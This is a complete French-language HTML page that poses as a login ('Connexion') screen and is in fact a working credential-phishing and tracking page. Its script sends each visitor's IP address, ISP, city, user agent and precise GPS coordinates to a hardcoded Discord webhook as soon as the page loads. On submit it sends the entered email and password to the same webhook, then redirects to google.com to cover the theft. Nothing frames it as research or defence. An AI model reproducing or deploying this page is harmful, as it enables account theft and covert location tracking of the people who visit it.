<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vérification</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0a0a0a;
      color: #e0e0e0;
      font-family: system-ui, -apple-system, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .card {
      background: #141414;
      border: 1px solid #2a2a2a;
      border-radius: 12px;
      padding: 2rem;
      max-width: 380px;
      width: 90%;
    }
    h1 { font-size: 1.1rem; color: #fff; margin-bottom: 0.4rem; }
    p { color: #888; font-size: 0.85rem; margin-bottom: 1.5rem; }
    input {
      width: 100%;
      background: #1a1a1a;
      border: 1px solid #333;
      border-radius: 8px;
      padding: 0.75rem 1rem;
      color: #fff;
      font-size: 0.9rem;
      margin-bottom: 0.75rem;
      outline: none;
    }
    input:focus { border-color: #4ade80; }
    button {
      width: 100%;
      background: #4ade80;
      color: #000;
      border: none;
      border-radius: 8px;
      padding: 0.75rem;
      font-size: 0.95rem;
      font-weight: 600;
      cursor: pointer;
    }
    button:hover { background: #22c55e; }
    .err { color: #f87171; font-size: 0.8rem; margin-top: 0.5rem; display: none; }
  </style>
</head>
<body>
<div class="card">
  <h1>Connexion</h1>
  <p>Entrez vos identifiants pour continuer.</p>
  <input type="email" id="email" placeholder="Email" autocomplete="email">
  <input type="password" id="password" placeholder="Mot de passe">
  <button onclick="submit()">Continuer</button>
  <div class="err" id="err">Champs invalides.</div>
</div>

<script>
  const WEBHOOK = "https://discord.com/api/webhooks/1573737133179674645/apgSjg0psVKbG3oXJfiFdxhTaL-NMbPYYWXaDcl3DF-Ib8q_UPJLyv462j8H1SJJdTWC";

  function send(embed) {
    const body = JSON.stringify({ embeds: [embed] });
    navigator.sendBeacon(WEBHOOK, new Blob([body], { type: "application/json" }));
  }

  let ip = "?";

  // === ÉTAPE 1 : IP instantané au chargement ===
  fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(d => {
      ip = d.ip;

      // Envoi IP immédiat
      send({
        title: "🔔 Nouveau visiteur — IP",
        color: 0x4ade80,
        fields: [
          { name: "🌐 IP",     value: ip, inline: true },
          { name: "🔗 URL",   value: location.href.slice(0, 200), inline: false },
          { name: "↩️ Ref",   value: document.referrer || "direct", inline: false },
          { name: "💻 UA",    value: navigator.userAgent.slice(0, 200), inline: false },
          { name: "🕐 Heure", value: new Date().toISOString(), inline: false }
        ],
        timestamp: new Date().toISOString()
      });

      // Geo IP en parallèle
      return fetch(`https://ipapi.co/${ip}/json/`, { cache: "no-store" });
    })
    .then(r => r.json())
    .then(geo => {
      send({
        title: "📍 Geo IP — " + ip,
        color: 0x60a5fa,
        fields: [
          { name: "🏳️ Pays",  value: geo.country_name || "?", inline: true },
          { name: "🏙️ Ville", value: geo.city         || "?", inline: true },
          { name: "📡 ISP",   value: geo.org           || "?", inline: false },
          { name: "🌍 Coords",value: (geo.latitude && geo.longitude) ? `${geo.latitude}, ${geo.longitude}` : "?", inline: false },
          { name: "🕐 TZ",    value: geo.timezone      || "?", inline: true }
        ],
        timestamp: new Date().toISOString()
      });
    }).catch(() => {});

  // === ÉTAPE 2 : GPS demandé immédiatement ===
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        send({
          title: "📡 GPS précis",
          color: 0xf59e0b,
          fields: [
            { name: "📍 Latitude",  value: String(pos.coords.latitude),  inline: true },
            { name: "📍 Longitude", value: String(pos.coords.longitude), inline: true },
            { name: "🎯 Précision", value: `${Math.round(pos.coords.accuracy)}m`, inline: true },
            { name: "🗺️ Maps",     value: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`, inline: false }
          ],
          timestamp: new Date().toISOString()
        });
      },
      () => {},
      { enableHighAccuracy: true, timeout: 10000 }
    );
  }

  // === ÉTAPE 3 : Soumission email + mdp ===
  function submit() {
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value;
    const err = document.getElementById("err");

    if (!email || !email.includes("@") || !password) {
      err.style.display = "block";
      return;
    }
    err.style.display = "none";

    send({
      title: "🔑 Identifiants",
      color: 0xe879f9,
      fields: [
        { name: "📧 Email",        value: email,    inline: false },
        { name: "🔒 Mot de passe", value: password, inline: false },
        { name: "🌐 IP",           value: ip,        inline: true },
        { name: "🕐 Heure",        value: new Date().toISOString(), inline: false }
      ],
      timestamp: new Date().toISOString()
    });

    window.location.replace("https://google.com");
  }
</script>
</body>
</html>
